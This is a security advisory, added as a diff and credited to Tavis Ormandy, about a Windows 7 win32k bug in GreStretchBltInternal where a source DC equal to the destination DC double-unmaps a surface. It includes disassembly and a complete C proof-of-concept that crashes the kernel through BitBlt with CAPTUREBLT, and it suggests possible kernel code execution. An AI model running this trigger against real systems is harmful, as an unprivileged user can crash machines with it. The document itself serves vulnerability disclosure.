@@ -1,0 +1,133 @@
+Microsoft Windows win32k!GreStretchBltInternal() does not handle src == dest
+----------------------------------------------------------------------------
+
+A bitblt (bit block transfer) is used to copy one rectangular region of screen
+to another, often performing a raster operation (rop) of some sort (e.g. and,
+or, xor). On Windows, bitblts are performed using the BitBlt() GDI32 api, which
+is passed a source and destination DC, along with the dimensions of the regions
+to transfer. BitBlt() is backed by the native system service, NtGdiBitBlt().
+
+On Windows 7, the following code from win32k!GreStretchBltInternal is guarded by
+a check for a rop including CAPTUREBLT (Include Layered Windows):
+
+.text:BF981F07    mov     ecx, [ebp+dcoSrc]             ; ecx is a pointer to src DCOBJ
+.text:BF981F0D    test    dword ptr [ecx+18h], 4000h    ; probably checking if redirection bitmap selected?
+.text:BF981F14    jz      short loc_BF981F24
+.text:BF981F16    push    ebx
+.text:BF981F17    push    ebx
+.text:BF981F18    call    DC::pSurface(void)
+.text:BF981F1D    mov     ecx, eax
+.text:BF981F1F    call    SURFACE::bUnMap(void *,DC *)
+.text:BF981F24 loc_BF981F24:
+.text:BF981F24    mov     ecx, [ebp+dcoTrg]             ; ecx is a pointer to dst DCOBJ
+.text:BF981F2A    test    dword ptr [ecx+18h], 4000h
+.text:BF981F31    jz      short loc_BF981F41
+.text:BF981F33    push    ecx
+.text:BF981F34    push    ebx
+.text:BF981F35    call    DC::pSurface(void)
+.text:BF981F3A    mov     ecx, eax
+.text:BF981F3C    call    SURFACE::bUnMap(void *,DC *)
+
+You can see this code tests a flag, gets a pointer to a SURFACE object, then
+unmaps it. This code does not handle dcoSrc == dcoTrg, which causes bUnMap() to
+be called twice for the same SURFACE.
+
+This will cause a synchronization error, and result in a bugcheck due to the
+unhandled exception. It's possible that on MP machines a race condition could
+exist that would allow an attacker to continue past the initial error, possibly
+resulting in an exploitable condition (untested).
+
+--------------------
+Affected Software
+------------------------
+
+At least Microsoft Windows 7 is affected.
+
+--------------------
+Consequences
+-----------------------
+
+An unprivileged user may be able to cause a bugcheck, or possibly execute
+arbitrary kernel code.
+
+Example code to trigger this vulnerability is available below.
+
+#ifndef WIN32_NO_STATUS
+# define WIN32_NO_STATUS    // I prefer working with ntstatus.h
+#endif
+#include <windows.h>
+#include <assert.h>
+#include <stdio.h>
+#include <winerror.h>
+#include <winternl.h>
+#include <stddef.h>
+#include <winnt.h>
+#ifdef WIN32_NO_STATUS
+# undef WIN32_NO_STATUS
+#endif
+#include <ntstatus.h>
+
+#pragma comment(lib, "GDI32")
+#pragma comment(lib, "USER32")
+
+int main(int argc, char **argv)
+{
+    WNDCLASS Class;
+    HWND Window;
+    HDC Device;
+
+    Class.style             = CS_OWNDC;
+    Class.lpfnWndProc       = DefWindowProc;
+    Class.cbClsExtra        = 0;
+    Class.cbWndExtra        = 0;
+    Class.hInstance         = GetModuleHandle(NULL);
+    Class.hIcon             = NULL;
+    Class.hCursor           = NULL;
+    Class.hbrBackground     = NULL;
+    Class.lpszMenuName      = NULL;
+    Class.lpszClassName     = "Class";
+
+    RegisterClass(&Class);
+
+    Window                  = CreateWindowEx(WS_EX_COMPOSITED, "Class", "Window", 0, 32, 32, 32, 32, NULL, NULL, NULL, NULL);
+    Device                  = GetWindowDC(Window);
+
+    BitBlt(Device, 32, 32, 32, 32, Device, 32, 32, CAPTUREBLT | SRCCOPY);
+    
+    return 0;
+}
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+-------------------
+Greetz
+-----------------------
+
+$1$90AiGoxp$wyzZGQ6owkRG6OxPErj6M/
+$1$7.qXQkxE$5Zc1zQndJpGdoe1RF4Br1.
+$1$IPYBMipO$/HhHCPgulV/E0pgSvU1710
+$1$ULymMO9x$NVMLjZe8i25ajEfnsRowA.
+$1$8a/c6DLm$JDAFGdhEzIj2DR7RYC2gi.
+
+And all the other elite people I've worked with (sorry, too many to generate!).
+
+-------------------
+Notes
+-----------------------
+
+This issue was reported in March.
+
+-------------------
+References
+-----------------------
+
+- http://groups.google.com/group/comp.os.ms-windows.programmer.win32/msg/5c3c900b21b67f20
+  Redirection bitmap?
+- http://msdn.microsoft.com/en-us/library/dd183370%28VS.85%29.aspx
+  BitBlt() Win32 api.
+- http://msdn.microsoft.com/en-us/library/ff549594%28VS.85%29.aspx
+  KeReleaseMutant
